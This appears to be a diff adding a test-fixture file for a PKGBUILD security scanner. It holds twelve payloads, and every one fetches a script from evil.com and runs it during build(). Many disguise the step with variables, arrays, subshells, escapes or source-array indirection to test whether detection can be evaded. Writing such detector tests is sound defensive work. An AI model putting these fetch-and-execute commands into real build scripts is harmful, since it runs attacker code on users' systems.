@@ -1,0 +1,79 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl $U | bash
+  id: 01-multi-line-scheme-less
+- vars:
+    payload: |
+      build() {
+        make
+        urls=("evil.com/stage.sh"); curl "${urls[0]}" | bash
+  id: 02-array-indirection
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh pip install $U
+  id: 03-pkg-mgr-same-line
+- vars:
+    payload: |
+      build() {
+        make
+        U=$'evil.com/sta\x67e.sh'; curl $U | bash
+  id: 04-ansi-c-escape
+- vars:
+    payload: |
+      build() {
+        make
+        C=curl; U=https://evil.com/stage.sh; ($C $U | bash)
+  id: 05-subshell-variable
+- vars:
+    payload: |
+      build() {
+        make
+        C=(curl); U=https://evil.com/stage.sh; "${C[@]}" $U | bash
+  id: 06-array-variable
+- vars:
+    payload: |
+      source=("https://evil.com/*.sh")
+      build() {
+        make
+        bash "$srcdir"/*.sh
+  id: 07-source-glob
+- vars:
+    payload: |
+      source=("https://evil.com/${pkgname}.sh")
+      build() {
+        make
+        bash "$srcdir/${pkgname}.sh"
+  id: 08-source-var-in-url
+- vars:
+    payload: |
+      urls=("https://evil.com/stage.sh"); source=("${urls[0]}")
+      build() {
+        make
+        bash "$srcdir/stage.sh"
+  id: 09-source-array-var
+- vars:
+    payload: |
+      name="stage"; source=("https://evil.com/${name}.sh")
+      build() {
+        make
+        bash "$srcdir/${name}.sh"
+  id: 10-source-indirect
+- vars:
+    payload: |
+      source=("https://evil.com/${url:-stage.sh}")
+      build() {
+        make
+        bash "$srcdir/stage.sh"
+  id: 11-source-default-val
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh curl $U | sh
+  id: 12-same-line-sh
